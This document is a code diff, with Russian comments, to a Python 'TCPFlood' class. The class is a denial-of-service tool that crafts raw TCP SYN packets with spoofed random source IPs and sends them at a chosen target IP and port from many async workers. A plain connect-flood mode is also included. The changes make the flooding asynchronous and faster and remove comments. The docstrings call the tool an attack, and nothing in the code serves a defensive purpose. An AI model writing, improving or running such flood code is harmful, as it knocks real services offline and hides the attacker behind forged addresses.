@@ -12,7 +12,7 @@ logger = logging.getLogger(__name__)
 
 
 class TCPFlood:
-    """TCP Flood атака с поддержкой спуфинга IP и настройки TTL."""
+    """TCP Flood атака с поддержкой спуфинга IP (асинхронные отправки)."""
     
     def __init__(self, target_ip: str, target_port: int, workers: int = 100,
                  spoof_ip: bool = False, packet_size: int = 1024,
@@ -31,28 +31,24 @@ class TCPFlood:
         self._tasks = []
         self._start_time = 0
         
-        # Для спуфинга IP
-        self.source_ips = []
         if spoof_ip:
             self.generate_spoof_ips()
     
     def generate_spoof_ips(self):
-        """Генерация случайных IP адресов для спуфинга."""
-        for _ in range(100):  # Генерируем пул IP
+        self.source_ips = []
+        for _ in range(100):
             ip = f"{random.randint(1, 254)}.{random.randint(0, 255)}." \
                  f"{random.randint(0, 255)}.{random.randint(1, 254)}"
             self.source_ips.append(ip)
     
     def craft_syn_packet(self, source_ip: str, source_port: int) -> bytes:
-        """Создание TCP SYN пакета с учётом TTL."""
-        # IP заголовок
         ip_ihl = 5
         ip_ver = 4
         ip_tos = 0
-        ip_tot_len = 20 + 20  # IP + TCP заголовки
+        ip_tot_len = 20 + 20
         ip_id = random.randint(0, 65535)
         ip_frag_off = 0
-        ip_ttl = self.ttl  # Используем заданный TTL
+        ip_ttl = self.ttl
         ip_proto = socket.IPPROTO_TCP
         ip_check = 0
         ip_saddr = socket.inet_aton(source_ip)
@@ -71,7 +67,6 @@ class TCPFlood:
             ip_daddr
         )
         
-        # TCP заголовок
         tcp_source = source_port
         tcp_dest = self.target_port
         tcp_seq = random.randint(0, 0xFFFFFFFF)
@@ -103,7 +98,6 @@ class TCPFlood:
             tcp_urg_ptr
         )
         
-        # Псевдо заголовок для checksum
         source_address = socket.inet_aton(source_ip)
         dest_address = socket.inet_aton(self.target_ip)
         placeholder = 0
@@ -119,7 +113,6 @@ class TCPFlood:
         )
         psh = psh + tcp_header
         
-        # Вычисление checksum
         tcp_check = self.checksum(psh)
         tcp_header = struct.pack('!HHLLBBH',
             tcp_source,
@@ -134,7 +127,6 @@ class TCPFlood:
         return ip_header + tcp_header
     
     def checksum(self, msg: bytes) -> int:
-        """Вычисление checksum для пакета."""
         s = 0
         for i in range(0, len(msg), 2):
             w = (msg[i] << 8) + (msg[i + 1] if i + 1 < len(msg) else 0)
@@ -145,7 +137,6 @@ class TCPFlood:
         return s
     
     async def start(self):
-        """Запуск TCP флуда."""
         self._running = True
         self._start_time = time.time()
         
@@ -153,7 +144,6 @@ class TCPFlood:
         print(f"{Fore.CYAN}🎯 Target: {self.target_ip}:{self.target_port}{Style.RESET_ALL}")
         print(f"{Fore.CYAN}📡 TTL: {self.ttl}{Style.RESET_ALL}")
         
-        # Проверка прав перед запуском
         if self.spoof_ip:
             try:
                 test_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
@@ -165,7 +155,6 @@ class TCPFlood:
         if self.source_port:
             print(f"{Fore.CYAN}🔌 Source port: {self.source_port}{Style.RESET_ALL}")
         
-        # Создаём задачи для воркеров
         self._tasks = []
         for i in range(self.workers):
             if self.spoof_ip:
@@ -174,42 +163,36 @@ class TCPFlood:
                 task = asyncio.create_task(self.normal_worker(i))
             self._tasks.append(task)
         
-        # Ожидаем завершения всех задач
         try:
             await asyncio.gather(*self._tasks)
         except asyncio.CancelledError:
             pass
     
     async def spoof_worker(self, worker_id: int):
-        """Воркер с IP спуфингом (требует root)."""
+        """Воркер с IP спуфингом (асинхронная отправка raw пакетов)."""
         sock = None
+        loop = asyncio.get_running_loop()
+        
         try:
-            # Создаём raw socket
             sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
             sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+            sock.setblocking(False)   # Для работы с loop.sock_sendto
             
-            # Определяем source port
             if self.source_port:
                 base_port = self.source_port
             else:
                 base_port = random.randint(1024, 65535)
             
             while self._running:
-                # Небольшая вариация порта
                 source_port = base_port + random.randint(0, 100)
-                
-                # Выбираем source IP
                 source_ip = random.choice(self.source_ips)
-                
-                # Создаём и отправляем пакет
                 packet = self.craft_syn_packet(source_ip, source_port)
                 
                 try:
-                    sock.sendto(packet, (self.target_ip, self.target_port))
+                    await loop.sock_sendto(sock, packet, (self.target_ip, self.target_port))
                     self.sent_packets += 1
                     self.sent_bytes += len(packet)
                     
-                    # Вывод статистики каждые 1000 пакетов
                     if self.sent_packets % 1000 == 0 and worker_id == 0:
                         elapsed = time.time() - self._start_time
                         pps = int(self.sent_packets / elapsed) if elapsed > 0 else 0
@@ -221,7 +204,6 @@ class TCPFlood:
                     await asyncio.sleep(0.001)
                     continue
                 
-                # Небольшая задержка
                 await asyncio.sleep(0.0001)
         
         except PermissionError:
@@ -238,56 +220,37 @@ class TCPFlood:
                     pass
     
     async def normal_worker(self, worker_id: int):
-        """Воркер без спуфинга (обычные сокеты)."""
-        sock = None
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.setblocking(False)
-            
-            while self._running:
-                try:
-                    # Просто пытаемся подключиться
-                    await asyncio.get_event_loop().sock_connect(sock, (self.target_ip, self.target_port))
-                    
-                    self.sent_packets += 1
-                    self.sent_bytes += 64  # Примерный размер SYN пакета
-                    
-                    # Сразу закрываем
-                    sock.close()
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    sock.setblocking(False)
-                    
-                    # Вывод статистики каждые 1000 пакетов
-                    if self.sent_packets % 1000 == 0 and worker_id == 0:
-                        elapsed = time.time() - self._start_time
-                        pps = int(self.sent_packets / elapsed) if elapsed > 0 else 0
-                        print(f"\r{Fore.WHITE}📦 Packets: {self.sent_packets:,} | "
-                              f"⚡ PPS: {pps:,} | "
-                              f"📊 {self.sent_bytes / 1024 / 1024:.1f} MB{Style.RESET_ALL}", end="")
-                    
-                except (ConnectionRefusedError, OSError):
-                    # Порт закрыт - пропускаем
-                    pass
-                except Exception as e:
-                    logger.debug(f"Normal worker error: {e}")
-                
-                await asyncio.sleep(0.001)
+        """Воркер без спуфинга (асинхронные сокеты)."""
+        loop = asyncio.get_running_loop()
         
-        except Exception as e:
-            if self._running:
-                logger.error(f"Worker {worker_id} error: {e}")
-        finally:
-            if sock:
-                try:
-                    sock.close()
-                except:
-                    pass
+        while self._running:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.setblocking(False)
+                
+                await loop.sock_connect(sock, (self.target_ip, self.target_port))
+                
+                self.sent_packets += 1
+                self.sent_bytes += 64
+                
+                sock.close()
+                
+                if self.sent_packets % 1000 == 0 and worker_id == 0:
+                    elapsed = time.time() - self._start_time
+                    pps = int(self.sent_packets / elapsed) if elapsed > 0 else 0
+                    print(f"\r{Fore.WHITE}📦 Packets: {self.sent_packets:,} | "
+                          f"⚡ PPS: {pps:,} | "
+                          f"📊 {self.sent_bytes / 1024 / 1024:.1f} MB{Style.RESET_ALL}", end="")
+                
+            except (ConnectionRefusedError, OSError, asyncio.TimeoutError):
+                pass
+            except Exception as e:
+                logger.debug(f"Normal worker error: {e}")
+            
+            await asyncio.sleep(0.001)
     
     def stop(self):
-        """Остановка атаки."""
         self._running = False
-        
-        # Отменяем все задачи
         for task in self._tasks:
             task.cancel()
         
